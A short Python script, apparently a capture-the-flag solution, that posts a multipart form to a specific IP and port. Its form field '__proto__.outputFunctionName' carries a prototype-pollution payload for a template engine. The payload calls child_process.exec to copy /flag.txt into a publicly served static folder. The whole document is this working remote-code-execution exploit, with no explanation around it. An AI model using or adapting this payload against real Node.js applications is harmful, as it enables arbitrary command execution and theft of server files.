import requests
 
 
resp1 = requests.post("http://{}:{}/{}".format('61.147.171.103', '56434', '4_pATh_y0u_CaNN07_Gu3ss'),
        files={'__proto__.outputFunctionName':
        (
            None, 
 
 
"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x".format(cmd='cp /flag.txt /app/static/js/flag.txt')
        )})
 
print(resp1)